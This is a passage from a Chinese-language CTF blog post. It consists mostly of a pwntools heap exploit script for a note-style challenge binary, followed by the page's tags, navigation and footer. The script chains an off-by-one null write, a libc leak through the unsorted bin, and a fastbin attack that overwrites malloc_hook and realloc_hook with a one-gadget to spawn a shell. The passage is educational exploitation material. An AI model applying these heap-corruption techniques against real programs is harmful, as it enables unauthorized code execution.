function_">delete</span>(<span class="params">index</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Your choice :\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Your choice :\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#chunk0  </span></span><br><span class="line">create(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)  </span><br><span class="line"><span class="comment">#chunk1  </span></span><br><span class="line">create(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x100</span>)  </span><br><span class="line"><span class="comment">#chunk2  </span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x68</span>)  </span><br><span class="line"><span class="comment">#chunk3  </span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x68</span>)  </span><br><span class="line"><span class="comment">#chunk4  </span></span><br><span class="line"><span class="comment">#特别！！chunk4后面0x10空间用于伪装假chunk5  </span></span><br><span class="line">create(<span class="number">0x100</span>,<span class="string">&#x27;e&#x27;</span>*(<span class="number">0x100</span>-<span class="number">16</span>) + p64(<span class="number">0x100</span>) + p64(<span class="number">0x11</span>))  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#chunk2用于放入fastbin  </span></span><br><span class="line">delete(<span class="number">2</span>)  </span><br><span class="line"><span class="comment">#chunk3用于溢出  </span></span><br><span class="line">delete(<span class="number">3</span>)  </span><br><span class="line"><span class="comment">#chunk0用于加入unsorted bin，并且让main_arena+88指针存入fd和bk  </span></span><br><span class="line">delete(<span class="number">0</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#把chunk3申请回来，并off by one null到chunk4,覆盖chunk4的低1字节为0  </span></span><br><span class="line">payload = <span class="string">&#x27;e&#x27;</span>*<span class="number">0x60</span>  </span><br><span class="line"><span class="comment">#prev_size  </span></span><br><span class="line">payload += p64(<span class="number">0x300</span>)  </span><br><span class="line">create(<span class="number">0x68</span>,payload)  </span><br><span class="line"><span class="comment">#0、1、2、3、4堆块合并  </span></span><br><span class="line">delete(<span class="number">4</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#申请掉chunk0后，main_area+88指针放到了chunk1的fd和bk处  </span></span><br><span class="line">create(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)  </span><br><span class="line">show()  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;1 : &#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">main_area_88 = u64(sh.recvuntil(<span class="string">&#x27; &#x27;</span>).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br><span class="line"><span class="comment">#低字节替换获得malloc_hook的地址  </span></span><br><span class="line">malloc_hook_addr = (main_area_88 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + (malloc_s_hook &amp; <span class="number">0xFFF</span>)  </span><br><span class="line">libc_base = malloc_hook_addr - malloc_s_hook  </span><br><span class="line">realloc_addr = libc_base +  realloc_s  </span><br><span class="line">gadget_addr = libc_base + gadget  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;malloc_hook_addr=&#x27;</span>,<span class="built_in">hex</span>(malloc_hook_addr)  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;realloc_addr=&#x27;</span>,<span class="built_in">hex</span>(realloc_addr)  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;gadget_addr=&#x27;</span>,<span class="built_in">hex</span>(gadget_addr)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#现在用fastbin attack  </span></span><br><span class="line"><span class="comment">#堆重叠，修改chunk2的fd指针  </span></span><br><span class="line">payload = <span class="string">&#x27;g&#x27;</span>*<span class="number">0x100</span>  </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)  </span><br><span class="line">payload += p64(malloc_hook_addr-<span class="number">0x23</span>)  </span><br><span class="line">create(<span class="number">0x118</span>,payload)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#第一次申请  </span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;h&#x27;</span>*<span class="number">0x68</span>)  </span><br><span class="line"><span class="comment">#修改realloc_hook和malloc_hook  </span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0xB</span> + p64(gadget_addr) + <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x13</span>-<span class="number">0xB</span>-<span class="number">0x8</span>)  </span><br><span class="line"><span class="comment">#用于堆栈调整  </span></span><br><span class="line">payload += p64(realloc_addr + <span class="number">2</span>)  </span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span>  </span><br><span class="line"><span class="comment">#第二次申请  </span></span><br><span class="line">create(<span class="number">0x68</span>,payload)  </span><br><span class="line"><span class="comment">#触发malloc_hook getshell  </span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Your choice :\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">sh.interactive()  </span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/unsorted-bin/" rel="tag"># unsorted bin</a>
+              <a href="/ha1vk/tags/fastbin/" rel="tag"># fastbin</a>
+              <a href="/ha1vk/tags/malloc-hook/" rel="tag"># malloc_hook</a>
+              <a href="/ha1vk/tags/off-by-one/" rel="tag"># off by one</a>
+              <a href="/ha1vk/tags/realloc-hook/" rel="tag"># realloc_hook</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2019/11/19/RCalc/" rel="prev" title="RCalc">
+      <i class="fa fa-chevron-left"></i> RCalc
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2019/11/21/notebook/" rel="next" title="Notebook(修改___stack_chk_fail的GOT表)">
+      Notebook(修改___stack_chk_fail的GOT表) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%82%A3%E4%B9%88%E5%A6%82%E4%BD%95%E6%89%8D%E8%83%BD%E4%BF%AE%E6%94%B9%E5%88%B0chunk2%E7%9A%84fd%E5%9F%9F%E5%91%A2%EF%BC%9F"><span class="nav-number">1.</span> <span class="nav-text">那么如何才能修改到chunk2的fd域呢？</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
